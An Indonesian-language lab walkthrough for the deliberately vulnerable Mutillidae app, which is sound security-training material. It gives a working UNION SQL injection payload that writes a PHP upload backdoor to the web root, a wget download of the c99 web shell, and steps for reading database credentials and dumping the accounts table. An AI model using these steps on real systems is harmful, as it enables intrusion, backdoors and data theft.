## Lesson 11 - SQL Injection Union Exploit \#4

### \# Mendownload c99.php (PHP SQL Injection)

* **Step 1** : Download file, lakukan command berikut
```
mkdir -p /root/backdoor
cd /root/backdoor/
wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson11/stuff.rar
ls -lrta
```
![](/assets/lesson-11/lesson11_1.JPG)

* **Step 2** : Unrar file dan gabungkan menjadi script, lakukan command berikut
```
unrar x stuff.rar
cat part1.txt part2.txt part3.txt > c99.php
cp c99.php c99.php.bkp
ls -lrta
```
![](/assets/lesson-11/lesson11_2.JPG)

* **Step 3** : Ubah header file php yang awalnya `<?` menjadi `<?php` kemudian file dan gabungkan menjadi script, lakukan command berikut
```
sed -i '1 s/^.*$/<?php/g' c99.php
ls -lrta
```
![](/assets/lesson-11/lesson11_3.JPG)


### \# Upload c99.php (PHP SQL Injection)

* **Step 1** : Buka `http://10.151.36.64/mutillidae/` lalu masuk ke halaman user info. Pilih sidebar. OWASP Top 10 --&gt; A1 - SQL Injection --&gt; SQLi - Extract Data --&gt; User Info
![](/assets/lesson-7/VirtualBox_kali_19_12_2017_03_01_34.png)

* **Step 2** : Ubah ukuran text box username menjadi 100% menggunakan inspect element agar text box lebih panjang untuk menuliskan syntax SQL Injection.  
![](/assets/lesson-8/VirtualBox_kali_19_12_2017_20_37_43.png)

* **Step 3** : Matikan AppArmor pada Metasploitable OS dengan `sudo /etc/init.d/apparmor stop`
AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivitas-aktivitas sistem. Hal ini agar MySQL memiliki akses read/write di directori web app.

* **Step 4** : Membuat Backdoor dengan SQL Union Injection dengan memasukan operasi sql di bawah di dalam textbox **Name** lalu tekan tombol _View Account Details_
```
' union select null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 770 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/mutillidae/upload_file.php' -- 
```
Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **upload_file.php**
![](/assets/lesson-9/injection_result.JPG)

* **Step 5** : Melihat hasil operasi dengan web browser di `http://10.151.36.64/mutillidae/upload_file.php` 
![](/assets/lesson-11/lesson11_4.JPG)

* **Step 6** : Pilih file c99.php yang kita buat tadi di `/root/backdoor/c99.php`, kemudian pilih Submit
![](/assets/lesson-11/lesson11_5.JPG)


### \# Mengambil autentikasi database

* **Step 1** : Melihat hasil operasi dengan web browser di `http://10.151.36.64/mutillidae/c99.php` 
![](/assets/lesson-11/lesson11_6.JPG)

* **Step 2** : Mengetahui working directory, dengan execute command `pwd`
![](/assets/lesson-11/lesson11_7.JPG)

* **Step 3** : Mencari file yang berisi konfigurasi database, dengan execute command `find /var/www/mutillidae | xargs grep -i "dbuser"`
![](/assets/lesson-11/lesson11_8.JPG)

* **Step 4** : Membuka file yang berisi konfigurasi database, dengan execute command `cat /var/www/mutillidae/config.inc`
![](/assets/lesson-11/lesson11_9.JPG)

Tercatat :
**host** : localhost atau 0.0.0.0
**user** : root
**password** : (kosong)
**nama database** : owasp10

### \# Mengakses database

* **Step 1** : Pilih tab **SQL** kemudian masukan autentikasi yang kita peroleh
![](/assets/lesson-11/lesson11_10.JPG)

* **Step 2** : Akan terlihat daftar tabel yang ada dalam database tersebut
![](/assets/lesson-11/lesson11_11.JPG)

* **Step 3** : Pilih tabel **accounts** kemudian pilih **insert** untuk memasukan data baru, lalu isi dengan data sesuka Anda
![](/assets/lesson-11/lesson11_12.JPG)

* **Step 4** : Kembali ke daftar akun di tabel **accounts**, terlihat akun kita masuk ke row terbaru
![](/assets/lesson-11/lesson11_13.JPG)

* **Step 5** : Pilih opsi **Dump** pada tabel **accounts**, sesuaikan paramater sesuai kebutuhan, kemudian pilih Dump.
![](/assets/lesson-11/lesson11_14.JPG)

* **Step 6** : File `.sql` yang tersimpan berisi sintaks SQL dari tabel **accounts** yang bisa kita gunakan
![](/assets/lesson-11/lesson11_15.JPG)







